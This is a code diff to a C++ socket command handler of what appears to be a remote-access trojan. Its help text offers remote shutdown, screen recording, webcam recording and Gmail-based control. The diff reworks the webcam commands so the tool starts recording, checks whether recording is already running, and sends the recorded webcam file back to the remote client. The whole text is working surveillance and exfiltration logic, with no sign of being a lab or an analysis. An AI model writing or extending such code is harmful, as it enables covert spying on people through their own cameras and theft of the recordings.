@@ -235,8 +235,8 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             "  shutdown                - Shutdown the system\n"
             "  start_record            - Start screen recording\n"
             "  stop_record             - Stop screen recording and send file to client\n"
-            "  start_webcam_record     - Start webcam recording\n"
-            "  stop_webcam_record      - Stop webcam recording and send file to client\n"
+            "  start_webcam_record     - Start webcam video recording\n"
+            "  stop_webcam_record      - Stop webcam video recording and send file to client\n"
             "  gmail_control           - Control by Gmail\n"
             "  exit                    - Disconnect from server\n";
         sendResponse(sock, helpMsg);
@@ -444,39 +444,6 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             sendResponse(sock, msg);
         }
     }
-    else if (cmd == "start_webcam_record")
-    {
-        std::string filename = "webcam_recording.avi";
-        startWebcamRecording(filename);
-        std::string msg = "Webcam recording started: " + filename;
-        sendResponse(sock, msg);
-    }
-    else if (cmd == "stop_webcam_record")
-    {
-        if (isWebcamRecording())
-        {
-            stopWebcamRecording();
-            std::string filename = "webcam_recording.avi";
-            std::string msg = "Webcam recording stopped.";
-            sendResponse(sock, msg);
-            
-            // Send the recording file to client
-            if (sendFileToClient(sock, filename))
-            {
-                std::cout << "Webcam recording file sent to client." << std::endl;
-            }
-            else
-            {
-                std::string errorMsg = "Failed to send webcam recording file to client.";
-                sendResponse(sock, errorMsg);
-            }
-        }
-        else
-        {
-            std::string msg = "No webcam recording in progress.";
-            sendResponse(sock, msg);
-        }
-    }
     else if(cmd == "start_record")
     {
         if (!isRecording())
@@ -515,6 +482,47 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         else
         {
             std::string msg = "No screen recording in progress.";
+            sendResponse(sock, msg);
+        }
+    }
+    else if (cmd == "start_webcam_record")
+    {
+        if (!isWebcamRecording())
+        {
+            std::string filename = "webcam_record.avi"; // Default filename
+            startWebcamRecording(filename);
+            std::string msg = "Webcam recording started: " + filename;
+            sendResponse(sock, msg);
+        }
+        else
+        {
+            std::string msg = "Webcam recording is already in progress.";
+            sendResponse(sock, msg);
+        }
+    }
+    else if (cmd == "stop_webcam_record")
+    {
+        if (isWebcamRecording())
+        {
+            stopWebcamRecording();
+            std::string filename = "webcam_record.avi";
+            std::string msg = "Webcam recording stopped.";
+            sendResponse(sock, msg);
+            
+            // Send the webcam recording file to client
+            if (sendFileToClient(sock, filename))
+            {
+                std::cout << "Webcam recording file sent to client." << std::endl;
+            }
+            else
+            {
+                std::string errorMsg = "Failed to send webcam recording file to client.";
+                sendResponse(sock, errorMsg);
+            }
+        }
+        else
+        {
+            std::string msg = "No webcam recording in progress.";
             sendResponse(sock, msg);
         }
     }
